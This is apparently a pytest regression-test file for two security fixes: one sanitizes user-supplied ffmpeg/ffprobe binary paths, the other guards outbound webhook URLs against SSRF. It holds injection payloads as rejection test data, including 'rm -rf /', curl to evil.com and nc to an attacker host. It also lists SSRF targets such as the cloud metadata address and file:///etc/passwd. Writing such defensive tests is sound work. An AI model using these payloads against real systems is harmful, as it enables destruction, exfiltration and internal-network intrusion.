"""Regression tests for round-10 security findings.

Covers:
- sanitize_ffmpeg_bin — prevents arbitrary-program execution via
  user-supplied ffmpeg_bin / ffprobe_bin POST payload
- is_safe_outbound_url — SSRF guard for user-supplied webhook URLs
"""

import os

import pytest

from modules.app_api.param_utils import is_safe_outbound_url, sanitize_ffmpeg_bin


# ── sanitize_ffmpeg_bin ──────────────────────────────────────────

def test_sanitize_accepts_default_plain_name():
    assert sanitize_ffmpeg_bin("ffmpeg") == "ffmpeg"
    assert sanitize_ffmpeg_bin("ffprobe", default="ffprobe") == "ffprobe"


def test_sanitize_rejects_unrelated_path():
    """Attacker POSTs ffmpeg_bin=/tmp/evil.sh → fall back to default."""
    assert sanitize_ffmpeg_bin("/tmp/evil.sh", default="ffmpeg") == "ffmpeg"


def test_sanitize_rejects_shell_metacharacters():
    """Shell metachars trigger fallback even though shell=False."""
    for payload in [
        "ffmpeg; rm -rf /",
        "ffmpeg && curl evil.com",
        "ffmpeg|nc attacker 1337",
        "ffmpeg`id`",
        "ffmpeg$(whoami)",
        "ffmpeg\nrm",
    ]:
        assert sanitize_ffmpeg_bin(payload) == "ffmpeg", f"did not reject: {payload!r}"


def test_sanitize_falls_back_on_wrong_basename():
    """/usr/bin/whoami is an existing executable but wrong basename → reject."""
    if os.path.isfile("/usr/bin/whoami"):
        assert sanitize_ffmpeg_bin("/usr/bin/whoami", default="ffmpeg") == "ffmpeg"


def test_sanitize_accepts_real_ffmpeg_absolute_path(tmp_path):
    """Operator may use an absolute path to a custom ffmpeg install."""
    # Create a fake ffmpeg binary for the test
    fake_ffmpeg = tmp_path / "ffmpeg"
    fake_ffmpeg.write_text("#!/bin/sh\necho fake")
    fake_ffmpeg.chmod(0o755)
    assert sanitize_ffmpeg_bin(str(fake_ffmpeg), default="ffmpeg") == str(fake_ffmpeg)


def test_sanitize_empty_or_none_returns_default():
    assert sanitize_ffmpeg_bin("") == "ffmpeg"
    assert sanitize_ffmpeg_bin(None) == "ffmpeg"
    assert sanitize_ffmpeg_bin("   ") == "ffmpeg"
    assert sanitize_ffmpeg_bin(None, default="ffprobe") == "ffprobe"


# ── is_safe_outbound_url ─────────────────────────────────────────

def test_ssrf_allows_public_https():
    ok, _ = is_safe_outbound_url("https://example.com/hook")
    assert ok is True


def test_ssrf_rejects_loopback():
    ok, reason = is_safe_outbound_url("http://127.0.0.1/evil")
    assert ok is False
    assert "内网" in reason or "loopback" in reason.lower() or "禁止" in reason


def test_ssrf_rejects_aws_metadata():
    ok, _ = is_safe_outbound_url("http://169.254.169.254/latest/meta-data/")
    assert ok is False


def test_ssrf_rejects_rfc1918_ranges():
    for url in [
        "http://10.0.0.1/",
        "http://172.16.0.1/",
        "http://192.168.1.1/",
    ]:
        ok, _ = is_safe_outbound_url(url)
        assert ok is False, f"failed to reject: {url}"


def test_ssrf_rejects_ipv6_loopback():
    ok, _ = is_safe_outbound_url("http://[::1]/")
    assert ok is False


def test_ssrf_rejects_non_http_schemes():
    for url in ["file:///etc/passwd", "gopher://evil", "ftp://x/"]:
        ok, _ = is_safe_outbound_url(url)
        assert ok is False


def test_ssrf_rejects_malformed_url():
    ok, _ = is_safe_outbound_url("http://")
    assert ok is False
